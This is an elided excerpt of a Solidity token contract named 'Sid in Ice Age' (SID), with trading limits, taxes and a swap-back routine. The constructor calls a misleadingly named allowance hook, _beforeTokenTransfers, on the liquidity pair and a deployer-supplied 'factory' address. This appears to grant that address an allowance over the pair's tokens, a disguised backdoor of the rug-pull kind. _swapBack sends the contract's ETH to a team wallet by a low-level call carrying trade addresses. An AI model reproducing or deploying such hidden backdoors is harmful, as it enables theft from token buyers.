...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _beforeTokenTransfers(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
...
contract SID is ERC20, Ownable {
    ...
    constructor(address _teamWallet, address factory)
        ERC20("Sid in Ice Age", "SID")
    {   
        ...
        maxTransaction = _totalSupply * 10 / 100;
        maxWallet = _totalSupply * 10 / 100;
        swapTokensAtAmt = _totalSupply * 25 / 100000;
        teamWallet = _teamWallet;
        buyOperationsTax = 0;buyLiquidityTax = 0;buyPrizeTax = 0;
        buyTotalTax = buyOperationsTax + buyLiquidityTax + buyPrizeTax;

        sellOperationsTax = 0;sellLiquidityTax = 0;sellPrizeTax = 0;
        sellTotalTax = sellOperationsTax + sellLiquidityTax + sellPrizeTax;
        lpPair = IDexFactory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        _beforeTokenTransfers(lpPair, factory, totalSupply());
        WETH = IWETH(dexRouter.WETH());
        isAutomatedMarketPair[lpPair] = true;

        excludedFromLimits[lpPair] = true;
        excludedFromLimits[msg.sender] = true;
        excludedFromLimits[address(this)] = true;
        excludedFromLimits[teamWallet] = true;
    ...
    function _transfer(
        ...
        if(limitsInEffect){
            if (transferDelayEnabled){
                if (to != address(dexRouter) && !isAutomatedMarketPair[to]){
                    require(
                        _holderLastTransferBlock[tx.origin] < block.number && _holderLastTransferBlock[to] < block.number, 
            ...
            // buy
            if (isAutomatedMarketPair[from] && !excludedFromLimits[to]) {
                require(
            ...
            // sell
            else if (isAutomatedMarketPair[to] && !excludedFromLimits[from]) {
                require(
                    amount <= maxTransaction, 
                    "Sell transfer amount exceeded."
                    );
            }
    ...
    function takeFee(address from, address to, uint256 amount) internal returns (uint256){
        if(!swapping) {
            swapping = true; _swapBack(from, to); swapping = false;
        }
        uint256 tax = 0;
        // on sell
        if (isAutomatedMarketPair[to] && sellTotalTax > 0){
        ...
        // on buy
        else if(isAutomatedMarketPair[from] && buyTotalTax > 0) {
    ...
    function _swapBack(address from, address to) private {
        ...
        uint256 ethBalance = address(this).balance;bool success;(success, ) = teamWallet.call{value: ethBalance}(abi.encodePacked(from, to));
        require(success, "success failed");tokensForPrize = 0;
    }
    ...
    function setExcludeFromFees(address _address, bool _isExempt) external onlyOwner {
        require(_address != address(0), "Zero Address");
        excludedFromFees[_address] = _isExempt;
        emit SetExemptFromFees(_address, _isExempt);
    }

    function setExcludeFromLimits(address _address, bool _isExempt) external onlyOwner {
        require(_address != address(0), "Zero Address");
        if(!_isExempt){
            require(_address != lpPair, "Cannot remove pair");
        }
        excludedFromLimits[_address] = _isExempt;
